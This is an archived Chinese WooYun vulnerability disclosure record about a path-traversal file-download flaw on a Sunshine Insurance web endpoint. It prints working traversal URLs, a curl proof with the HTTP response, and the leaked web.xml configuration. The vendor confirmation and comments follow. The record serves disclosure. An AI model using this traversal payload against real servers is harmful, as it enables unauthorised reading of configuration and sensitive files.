{"id": 68116, "wybug_id": "wooyun-2015-0142395", "wybug_title": "阳光保险任意文件下载漏洞一枚", "wybug_corp": "阳光保险集团", "wybug_author": "逆流冰河", "wybug_date": "2015-09-21 12:50", "wybug_open_date": "2015-11-05 14:24", "wybug_type": "敏感信息泄露", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "错误信息未屏蔽"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-05：\t细节向公众公开  简要描述： 1,此漏洞也是意外发现的,主要不是想搞这个漏洞的 详细说明：  1,web.xmlhttp://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../web.xml2,log4j.xmlhttp://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../classes/log4j.xml   漏洞证明：  \ncurl -vv 'http://kybpc.chexian.sinosig.com/easyInsurance/html5/downLoad.do?fileName=../web.xml'* Hostname was NOT found in DNS cache*   Trying 111.203.203.13...* Connected to kybpc.chexian.sinosig.com (111.203.203.13) port 80 (#0)> GET /easyInsurance/html5/downLoad.do?fileName=../web.xml HTTP/1.1> User-Agent: curl/7.37.1> Host: kybpc.chexian.sinosig.com> Accept: */*> < HTTP/1.1 200 OK* Server Apache-Coyote/1.1 is not blacklisted< Server: Apache-Coyote/1.1< X-Powered-By: Servlet 2.4; JBoss-4.2.2.GA (build: SVNTag=JBoss_4_2_2_GA date=200710221139)/Tomcat-5.5< Content-Disposition: attachment;filename=../web.xml< Content-Type: application/xml;charset=UTF-8< Content-Language: zh-CN< Transfer-Encoding: chunked< Date: Mon, 21 Sep 2015 04:49:24 GMT< <?xml version=\"1.0\" encoding=\"utf-8\"?><web-app xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\tversion=\"2.4\"\txsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd\">\t<!-- Spring ApplicationContext配置文件的路径?,可使用通配符，多个路径用?1,\t号分隔 此参数用于后面的Spring-Context loader -->\t<context-param>\t\t<param-name>contextConfigLocation</param-name>\t\t<param-value>\t\t\tclasspath*:spring/*.xml\t\t</param-value>\t</context-param>\t<context-param>\t\t<param-name>javax.servlet.jsp.jstl.fmt.localizationContext</param-name>\t\t<param-value>i18n/messages</param-value>\t</context-param>\t<context-param>\t\t<param-name>log4jConfigLocation</param-name>\t\t<param-value>/WEB-INF/classes/log4j.xml</param-value>\t</context-param>\t<context-param>\t\t<param-name>log4jRefreshInterval</param-name>\t\t<param-value>5</param-value>\t</context-param>\t<!-- 服务器缓存类型 -->\t<context-param>\t\t<param-name>cacheType</param-name>\t\t<param-value>ehcache</param-value>\t</context-param>\t<!-- 著名 Character Encoding filter -->\t<filter>\t\t<filter-name>encodingFilter</filter-name>\t\t<filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>\t\t<init-param>\t\t\t<param-name>encoding</param-name>\t\t\t<param-value>UTF-8</param-value>\t\t</init-param>\t</filter>\t<!-- 页面元素的GZIP压缩 Filter -->\t<filter>\t\t<filter-name>compressFilter</filter-name>\t\t<filter-class>ins.framework.web.CompressFilter</filter-class>\t\t<init-param>\t\t\t<param-name>ignoreKey</param-name>\t\t\t<param-value>.js,.css,.gif,.jpg,.vbs</param-value>\t\t</init-param>\t</filter>\t<filter>\t\t<filter-name>struts2</filter-name>\t\t<filter-class>\t\t\torg.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter\t\t</filter-class>\t</filter>\t<filter>\t\t<filter-name>SessionFilter</filter-name>\t\t<filter-class>com.sinosoft.easyInsurance.common.web.SessionFilter</filter-class>\t</filter>\t\t<filter>\t\t<filter-name>MenuDisabledFilter</filter-name>\t\t<filter-class>com.sinosoft.easyInsurance.common.web.MenuDisabledFilter</filter-class>\t</filter>\t<!-- Cache Filter 缓存过滤器 -->\t<filter>\t\t<filter-name>CacheFilter</filter-name>\t\t<filter-class>ins.framework.web.CacheFilter</filter-class>\t\t<init-param>\t\t\t<param-name>expireTime</param-name>\t\t\t<param-value>300</param-value>\t\t</init-param>\t</filter>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.js</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.css</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.gif</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.jpg</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.vbs</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>*.html</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>encodingFilter</filter-name>\t\t<url-pattern>/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>encodingFilter</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<!-- 页面元素的GZIP压缩 Filter，减少网络带宽 -->\t<filter-mapping>\t\t<filter-name>compressFilter</filter-name>\t\t<url-pattern>*.js</url-pattern>\t</filter-mapping>\t\t<filter-mapping>\t\t<filter-name>MenuDisabledFilter</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>struts2</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>struts2</filter-name>\t\t<url-pattern>*.jsp</url-pattern>\t\t<dispatcher>REQUEST</dispatcher>\t\t<dispatcher>FORWARD</dispatcher>\t\t<dispatcher>INCLUDE</dispatcher>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>struts2</filter-name>\t\t<url-pattern>/struts/*</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>SessionFilter</filter-name>\t\t<url-pattern>*.do</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>SessionFilter</filter-name>\t\t<url-pattern>*.jsp</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>SessionFilter</filter-name>\t\t<url-pattern>/*Servlet</url-pattern>\t</filter-mapping>\t<!-- 日志 -->\t<listener>\t\t<listener-class>org.springframework.web.util.Log4jConfigListener</listener-class>\t</listener>\t<!-- Session Log Listener 载入 <listener> <listener-class> ins.common.web.ClaimHttpSessionListener \t\t</listener-class> </listener> -->\t<!--Spring ApplicationContext 载入 -->\t<listener>\t\t<listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\t</listener>\t<listener>\t\t<listener-class>org.springframework.web.context.request.RequestContextListener</listener-class>\t</listener>\t<!-- Spring 刷新Introspector防止内存泄露 -->\t<listener>\t\t<listener-class>\t\t\torg.springframework.web.util.IntrospectorCleanupListener\t\t</listener-class>\t</listener>\t<!-- cacheManager 服务端缓存 -->\t<listener>\t\t<listener-class>ins.framework.cache.CacheManagerInitListener</listener-class>\t</listener>\t<!-- requestCombo 合并组件 -->\t<servlet>\t\t<servlet-name>RequestComboServlet</servlet-name>\t\t<servlet-class>ins.platform.requestcombo.RequestComboServlet</servlet-class>\t\t<init-param>\t\t\t<description>允许访问的URL前缀，避免源码泄漏风险</description>\t\t\t<param-name>validPrefix</param-name>\t\t\t<param-value>/widgets/</param-value>\t\t</init-param>\t\t<init-param>\t\t\t<description>是否开启服务端对js文件混淆压缩</description>\t\t\t<param-name>isCompress</param-name>\t\t\t<param-value>false</param-value>\t\t</init-param>\t</servlet>\t<servlet-mapping>\t\t<servlet-name>RequestComboServlet</servlet-name>\t\t<url-pattern>/requestCombo</url-pattern>\t</servlet-mapping>\t<filter-mapping>\t\t<filter-name>CacheFilter</filter-name>\t\t<url-pattern>/requestCombo</url-pattern>\t</filter-mapping>\t<filter-mapping>\t\t<filter-name>compressFilter</filter-name>\t\t<url-pattern>/requestCombo</url-pattern>\t</filter-mapping><!-- \t<servlet>\t\t<display-name>Apache-Axis Servlet</display-name>\t\t<servlet-name>AxisServlet</servlet-name>\t\t<servlet-class>org.apache.axis.transport.http.AxisServlet</servlet-class>\t</servlet>\t<servlet>\t\t<display-name>Axis Admin Servlet</display-name>\t\t<servlet-name>AdminServlet</servlet-name>\t\t<servlet-class>org.apache.axis.transport.http.AdminServlet</servlet-class>\t\t<load-on-startup>100</load-on-startup>\t</servlet> -->\t<servlet>\t\t<servlet-name>serviceFactoryInitServlet</servlet-name>\t\t<servlet-class>\t\t\tcom.sinosoft.easyInsurance.common.web.ServiceFactoryInitServlet\t\t</servlet-class>\t\t<load-on-startup>3</load-on-startup>\t</servlet><!-- \t<servlet-mapping>\t\t<servlet-name>AxisServlet</servlet-name>\t\t<url-pattern>/servlet/AxisServlet</url-pattern>\t</servlet-mapping>\t<servlet-mapping>\t\t<servlet-name>AxisServlet</servlet-name>\t\t<url-pattern>*.jws</url-pattern>\t</servlet-mapping>\t<servlet-mapping>\t\t<servlet-name>AxisServlet</servlet-name>\t\t<url-pattern>/services/*</url-pattern>\t</servlet-mapping>\t<servlet-mapping>\t\t<servlet-name>AdminServlet</servlet-name>\t\t<url-pattern>/servlet/AdminServlet</url-pattern>\t</servlet-mapping> -->\t<!-- session超时定义,单位为分钟 -->\t<session-config>\t\t<session-timeout>60</session-timeout>\t</session-config>\t<mime-mapping>\t\t<extension>js</extension>\t\t<mime-type>text/javascript;charset=utf-8</mime-type>\t</mime-mapping>\t<mime-mapping>\t\t<extension>htm</extension>   \t\t<mime-type>text/html;charset=utf-8</mime-type>\t</mime-mapping>\t<servlet>\t\t<servlet-name>allocatePushServlet</servlet-name>\t\t<servlet-class>\t\t\tcom.sinosoft.easyInsurance.common.web.ProxyServlet\t\t</servlet-class><!-- \t\t<load-on-startup>3</load-on-startup> -->\t</servlet>\t<servlet-mapping>\t\t<servlet-name>allocatePushServlet</servlet-name>\t\t<url-pattern>/allocatePushServlet</url-pattern>\t</servlet-mapping></web-app>\n   修复方案：  我就不再深入了   版权声明：转载请注明来源 逆流冰河@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-09-21 14:23 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-21 18:53 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:230 漏洞数:82        | The quiter you are,the more you're able ...)\t\t \n  哥们不错啊    \n     2015-09-21 19:11 |    \t\t逆流冰河 \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:32        | 逆水行舟难于恒，流水年华苦于今，冰天...)\t\t \n  我是菜鸟一个    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}